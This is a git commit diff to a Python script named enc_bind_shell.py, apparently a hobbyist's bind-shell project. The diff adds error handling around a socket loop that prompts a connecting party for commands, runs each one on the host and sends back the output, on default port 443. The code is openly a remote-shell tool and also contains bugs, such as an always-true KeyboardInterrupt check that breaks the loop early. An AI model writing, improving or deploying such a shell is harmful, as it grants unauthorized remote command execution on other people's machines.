3b1454b7551c7e258c0ae2bb51b4e982a797d860
Zin <zinedinemokhefi@gmail.com>
2025-04-11 09:49:16 +0200

    Grind

--- Python_bind_shell/enc_bind_shell.py
+++ Python_bind_shell/enc_bind_shell.py
@@ -4,6 +4,7 @@ import subprocess
 import threading
 import argparse
 
+
 MAX_BUFFER = 4096
 DEFAULT_PORT = 443
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -19,21 +20,32 @@ def execute_cmd(cmd):
 print(execute_cmd("whoami").decode())
 
 def shell_thread(sock):
-    
-    sock.send(f": ENTER COMMANDS TO EXECUTE : LocalIP_OF_Machine:[{IP}]") #I think im getting the hang outta this.
+    try:
+        sock.send(f": ENTER COMMANDS TO EXECUTE : LocalIP_OF_Machine:[{IP}]") #I think im getting the hang outta this.
 
-    while True:
-        sock.send(b"\r\nEnter Command")
-        
-        data = sock.recv(MAX_BUFFER)
-        if data:
-            buffer = data.decode()
+        while True:
+            sock.send(b"\r\nEnter Command")
+            
+            data = sock.recv(MAX_BUFFER)
+            if data:
+                buffer = data.decode()
 
-            if not buffer or buffer == "exit":
-                print("Exit: Trallalelo Tralala")
-        if KeyboardInterrupt:
-            print(b"Keyboard Interrupt: Exiting\r\n")
-            break
+                if not buffer or buffer == "exit":
+                    print("Exit: Trallalelo Tralala")
+            if KeyboardInterrupt:
+                print(b"Keyboard Interrupt: Exiting\r\n")
+                break
 
-        print(f"Executing Command: {buffer}") #Execute whatever we send., Then return the Output
-        sock.send(execute_cmd(buffer))
+            print(f"Executing Command: {buffer}") #Execute whatever we send., Then return the Output
+            sock.send(execute_cmd(buffer))
+
+    except ConnectionAbortedError:
+        print("Connection aborted:")
+    except ConnectionRefusedError:
+        print("Connection blocked:")
+    except ConnectionResetError:
+        print("Connection Reset, Did the Firewall block you?, Or the Host close his Enddevice?")
+    except ConnectionError:
+        print("Connection Error:")
+    except Exception as e:
+        print(f"Unexpected Error: [{e}]")
